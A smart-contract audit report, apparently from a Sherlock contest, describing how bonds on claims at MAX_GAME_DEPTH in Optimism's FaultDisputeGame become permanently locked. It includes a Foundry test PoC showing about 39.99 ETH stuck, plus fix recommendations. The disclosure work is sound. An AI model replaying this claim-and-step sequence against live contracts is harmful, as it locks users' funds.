Sharp Pecan Ape

high

# Bonds at `MAX_GAME_DEPTH`` can be irrevocably locked

## Summary

Scenarios are possible, when the `FaultDisputeGame` as a whole resolves, but claims at `MAX_GAME_DEPTH` remain unresolved. As a result, all bonds associated with these unresolved claims become permanently locked.

## Vulnerability Detail

When the game DAG is extended with moves up to the last level (at `MAX_GAME_DEPTH`), and the claim at this level is countered by a step, the parent of the last-but-one claim is labeled as countered, but the last claim remains unresolved. As a result, it becomes possible to resolve all claims, excluding the claims at `MAX_GAME_DEPTH`, as well as to resolve the game as a whole, while the most deep claims remain unresolved. 

As the associated bonds are unlocked only when the claim is resolved, and it's not possible to resolve the claim when the whole game is resolved, the bonds associated with the most deep claims will become permanently locked.

The secondary vulnerability is associated with calculations of the clock duration. When [grandparent clock](https://github.com/sherlock-audit/2024-02-optimism-2024/blob/main/optimism/packages/contracts-bedrock/src/dispute/FaultDisputeGame.sol#L262-L280) is shifted, the clock of the deepest claim becomes shifted in such a way that it is not possible to resolve it before the whole game is resolved. Combined with the previous, there is not time period when the most deep claim may be resolved, leading to guaranteed locking of user funds, as the below coded PoC demonstrates.

## Impact

Permanent locking of user funds in unresolvable claims.

## Coded PoC

The below PoC is a slight adaptation of the test [test_resolve_bondPayoutsSeveralActors_succeeds](https://github.com/sherlock-audit/2024-02-optimism-2024/blob/main/optimism/packages/contracts-bedrock/test/dispute/FaultDisputeGame.t.sol#L725-L807). Copy-paste the PoC after this test, and execute with `forge test -vvvv --match-test test_exploit_lockFundsAtMaxGameDepth`. As can be seen, in case of a single unresolvable claim the amount of permanently locked funds is 39.99 Eth.

```solidity
    function test_exploit_lockFundsAtMaxGameDepth() public {
        // Give the test contract and bob some ether
        uint256 bal = 1000 ether;
        address bob = address(0xb0b);
        vm.deal(address(this), bal);
        vm.deal(bob, bal);


        // Make claims all the way down the tree, trading off between bob and the test contract.
        uint256 curBond = _getRequiredBond(0);
        uint256 thisBonded = curBond;
        gameProxy.attack{ value: curBond }(0, _dummyClaim());

        curBond = _getRequiredBond(1);
        uint256 bobBonded = curBond;
        vm.prank(bob);
        gameProxy.attack{ value: curBond }(1, _dummyClaim());

        curBond = _getRequiredBond(2);
        thisBonded += curBond;
        gameProxy.attack{ value: curBond }(2, _dummyClaim());

        curBond = _getRequiredBond(3);
        bobBonded += curBond;
        vm.prank(bob);
        gameProxy.attack{ value: curBond }(3, _dummyClaim());

        curBond = _getRequiredBond(4);
        thisBonded += curBond;
        gameProxy.attack{ value: curBond }(4, _changeClaimStatus(_dummyClaim(), VMStatuses.PANIC));

        curBond = _getRequiredBond(5);
        bobBonded += curBond;
        vm.prank(bob);
        gameProxy.attack{ value: curBond }(5, _dummyClaim());

        // The bond at MAX_GAME_DEPTH-1 is with a delay
        vm.warp(block.timestamp + 12 hours);
        curBond = _getRequiredBond(6);
        thisBonded += curBond;
        gameProxy.attack{ value: curBond }(6, _dummyClaim());

        // The bond at MAX_GAME_DEPTH is with a delay
        vm.warp(block.timestamp + 12 hours);
        curBond = _getRequiredBond(7);
        bobBonded += curBond;
        vm.prank(bob);
        gameProxy.attack{ value: curBond }(7, _dummyClaim());

        gameProxy.addLocalData(LocalPreimageKey.DISPUTED_L2_BLOCK_NUMBER, 8, 0);
        gameProxy.step(8, true, absolutePrestateData, hex"");

        // Ensure that the step successfully countered the leaf claim.
        (, address counteredBy,,,,,) = gameProxy.claimData(8);
        assertEq(counteredBy, address(this));

        // Ensure we bonded the correct amounts
        assertEq(address(this).balance, bal - thisBonded);
        assertEq(bob.balance, bal - bobBonded);
        assertEq(address(gameProxy).balance, 0);
        assertEq(delayedWeth.balanceOf(address(gameProxy)), thisBonded + bobBonded);

        vm.warp(block.timestamp + 2 days + 12 hours + 1 seconds);

        // The resolution of the last claim is not possible, because clock has not expired yet
        // Expect ClockNotExpired
        (bool success,) = address(gameProxy).call(abi.encodeCall(gameProxy.resolveClaim, gameProxy.claimDataLen()-1));
        assertFalse(success);

        // Resolve all claims, EXCEPT THE LAST ONE
        for (uint256 i = gameProxy.claimDataLen()-1; i > 0; i--) {
            (success,) = address(gameProxy).call(abi.encodeCall(gameProxy.resolveClaim, (i - 1)));
            assertTrue(success);
        }
        // Also resolve the whole game. Notice that the last claim stays unresolved
        gameProxy.resolve();

        // The resolution of the last claim is not possible anymore, as the game is resolved
        // Expect GameNotInProgress
        (success,) = address(gameProxy).call(abi.encodeCall(gameProxy.resolveClaim, gameProxy.claimDataLen()-1));
        assertFalse(success);

        // Wait for the withdrawal delay
        vm.warp(block.timestamp + delayedWeth.delay() + 1 seconds);

        // Claim credits        
        gameProxy.claimCredit(address(this));

        // Bob's claim should revert since it's value is 0
        vm.expectRevert(NoCreditToClaim.selector);
        gameProxy.claimCredit(bob);

        // Bob's balance is correct
        assertEq(bob.balance, bal - bobBonded);
        // This balance is not correct...
        assertEq(address(this).balance, bal + bobBonded - 39999999800000000000);
        // because part of it is irrevocably locked in the game.
        assertEq(delayedWeth.balanceOf(address(gameProxy)), 39999999800000000000);
    }
```

## Code Snippet

https://github.com/sherlock-audit/2024-02-optimism-2024/blob/main/optimism/packages/contracts-bedrock/src/dispute/FaultDisputeGame.sol#L217-L219

https://github.com/sherlock-audit/2024-02-optimism-2024/blob/main/optimism/packages/contracts-bedrock/src/dispute/FaultDisputeGame.sol#L262-L280

## Tool used

Manual Review; Foundry

## Recommendation

We recommend to fix the `step` function, in that when updating the parent claim as countered, it should also resolve the current claim. We further recommend to redesign the clock computations when grandparent clocks are involved.